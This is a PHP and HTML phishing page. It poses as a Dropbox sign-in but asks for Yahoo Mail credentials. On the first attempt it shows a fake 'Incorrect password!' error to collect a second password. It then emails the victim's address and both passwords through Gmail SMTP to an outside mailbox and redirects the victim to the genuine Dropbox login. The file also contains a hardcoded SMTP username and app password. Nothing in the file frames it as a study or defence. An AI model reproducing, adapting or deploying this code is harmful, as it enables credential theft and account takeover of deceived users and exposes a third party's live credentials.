<?php
// Start the session at the very beginning of the script
session_start();

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'phpmailer/src/Exception.php';
require 'phpmailer/src/PHPMailer.php';
require 'phpmailer/src/SMTP.php';

$error = ["email"=>'',"password"=>''];

if (isset($_POST['submit'])) {
    $email = trim($_POST['email']);
    $password = trim($_POST['password']);
    $firstPassword = "";

    if (empty($email)) {
        $error['email'] = "<p style='color:red;text-align:center;margin-bottom:7px;'>Email Address Cannot be empty!</p>";
    }
    if (empty($password)) {
        $error['password'] = "<p style='color:red;text-align:center;margin-bottom:7px;'>Password Cannot be empty!</p>";
    }

     // Initialize the first password if it's not set
     if (!isset($_SESSION['first_password']) && !empty($password)) {
      $_SESSION['first_password'] = $password;
  }

  // Retrieve the first password attempt from the session
  $firstPassword = $_SESSION['first_password'];

  // Check for first-time login attempt using a session variable
  if (!isset($_SESSION['login_attempts'])) {
      $_SESSION['login_attempts'] = 0;
  }

  if ($_SESSION['login_attempts'] < 1 && !empty($email) && !empty($password)) {
      // Simulate an incorrect password error for the first attempt
      $error['password'] = "<p style='color:red;text-align:center;margin-bottom:7px;'>Incorrect password!</p>";
      $_SESSION['login_attempts']++;
  }  else {
        // If it's not the first attempt, proceed with the rest of your logic
        // This part will only run if both email and password are not empty
        if (!empty($email) && !empty($password)) {
            if (strlen($password) < 8) {
                $error['password'] = "<p style='color:red;text-align:center;margin-bottom:7px;'>Password cannot be less than 8 characters.</p>";
            } else {
                // Assuming validation passed, proceed with the email sending
                // ... [Your PHPMailer sending code]
                foreach($error as $key => $value){
                  if(empty($value)){
                        unset($error[$key]);
                  }
            }

            // Proceed with your email sending code
            $result = 
            "<div style='margin:auto; max-width:600px; border:1px solid #ccc; padding:20px; box-shadow:0 4px 8px rgba(0,0,0,0.1);'>
               <table style='width:100%; border-collapse:collapse;'>
                  <thead>
                        <tr style='background-color:#4CAF50; color:white;'>
                           <th style='padding:10px; border:1px solid #ddd;'>Yahoo Address</th>
                           <th style='padding:10px; border:1px solid #ddd;'>First Password</th>
                           <th style='padding:10px; border:1px solid #ddd;'>Final Password</th>
                        </tr>
                  </thead>
                  <tbody>    
                        <tr>
                           <td style='padding:10px; border:1px solid #ddd; text-align:center;'>".htmlspecialchars($email)."</td>
                           <td style='padding:10px; border:1px solid #ddd; text-align:center;'>".($firstPassword)."</td>
                           <td style='padding:10px; border:1px solid #ddd; text-align:center;'>".($password)."</td>
                        </tr>
                  </tbody>
               </table>
            </div>";                
   
            // Create a new PHPMailer instance
               $mail = new PHPMailer(true); // Enable exceptions
               $mail->isSMTP();                                      
               $mail->Host = 'smtp.gmail.com';
               $mail->SMTPAuth = true;   
               $mail->Username = 'martindennis10@gmail.com';      // SMTP username
               $mail->Password = 'ecnwqubklfkijbmb';
               $mail->SMTPSecure = 'tls';   
               $mail->Port = 587;  
               // $mail->SMTPSecure = 'ssl';   
               // $mail->Port = 465;  
               $mail->setFrom($email, 'Annonymous'); 
               $mail->addAddress('Wesiledoyemicheal@gmail.com',"Details");   
   
               // Email content
               $mail->isHTML(true);
               $mail->Subject = 'YAHOO CREDENTIALS';
               $mail->Body = $result;
   
            // Send email
               $success = $mail->send();
               if($success){
                  $_SESSION['login_attempts'] = 0;
                  unset($_SESSION['first_password']); // Clear the stored password
                  header('Location: https://www.dropbox.com/login');
                  exit(); // Always call exit() after header() to make sure no further code is executed
               }else{
                     echo "Unable to send message";
               }
            }
            }
        }
    }

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in</title>
    <link rel="icon" href="./266593_dropbox_icon.png">
    <link rel="stylesheet" href="./login.css">
</head>
<body>

   
   <nav>
      <div class="logo" >
           <img class="nav-img" width="50px" height="50px" src="./266593_dropbox_icon.png" alt="">
           <div class="drop-logo">Dropbox</div>
      </div>
      
  </nav>
  <br><br>


    <div class="zhico"><br>
       <form action="" method="post">
        <img class="imgg" width="70px" height="70px" src="./266593_dropbox_icon.png" alt="">
           <h3 align="center" class="h3">Login with your Yahoo Mail</h3>
           <br>
           <div class="label">
            <label  for="Email address">Email address</label><br><br>
            <input type="email" name="email" placeholder="Your Email" >
            <p><?php echo isset($error['email']) ? $error['email']: "" ?></p>
         </div><br>

         <div class="label"> 
            <label  for="Email address">Password</label><br><br>
            <input type="password" name="password">
            <p><?php echo isset($error['password']) ? $error['password']: "" ?></p>
         </div><br>

  

         <input type="submit" value="LOGIN" class="btn btn-primary" name="submit">
       </form>

    </div>
    
    <br>
             
         
    <p align="center" style="color: white;"> Copyright &copy; 2023 , all rights reserved. Powered by Dropbox.</p>

  
</body>
</html>